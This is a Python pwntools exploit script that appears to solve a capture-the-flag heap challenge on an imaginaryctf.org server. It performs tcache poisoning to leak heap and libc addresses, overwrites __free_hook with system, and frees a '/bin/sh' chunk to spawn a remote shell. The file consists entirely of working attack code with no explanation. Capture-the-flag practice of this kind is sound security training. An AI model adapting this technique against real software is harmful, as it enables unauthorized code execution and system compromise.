from pwn import *

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

# context.log_level = "debug"
# io = process("./vuln")
# io = gdb.debug("./vuln", "c")
io = remote("puzzler7.imaginaryctf.org", 31337)


def malloc(i):
    io.sendlineafter(b"(c)", b"c")
    io.sendlineafter(b"Where should I store your bagel?\n", str(i).encode())


def free(i):
    io.sendlineafter(b"(c)", b"e")
    io.sendlineafter(b"Which bagel do you want to eat?\n", str(i).encode())


def view(i):
    io.sendlineafter(b"(c)", b"v")
    io.sendlineafter(b"Which bagel do you want to view?\n", str(i).encode())


def write(i, b):
    io.sendlineafter(b"(c)", b"d")
    io.sendlineafter(b"Which bagel do you want to decorate?\n", str(i).encode())
    io.sendlineafter(b"What do you want to write on the bagel?\n", b)


malloc(0)
malloc(1)
malloc(2)
free(2)
free(1)
view(1)
addr = int.from_bytes(io.recv(6), "little") - 0x2E8  # this address contains libc
print(f"{addr = :#x}")
write(1, p64(addr))
malloc(1)
malloc(2)  # mem[2] = addr
view(2)
libc_base = int.from_bytes(io.recv(6), "little") - 0x3EC680
print(f"{libc_base = :#x}")
free_hook = libc_base + 0x3ED8E8
print(f"{free_hook = :#x}")
system = libc_base + 0x4F4E0
print(f"{system = :#x}")
free(1)
free(0)
write(0, p64(free_hook))
malloc(0)
malloc(1)  # mem[1] = free_hook
write(1, p64(system))
write(0, b"/bin/sh\0")
free(0)  # system("/bin/sh")

io.interactive()
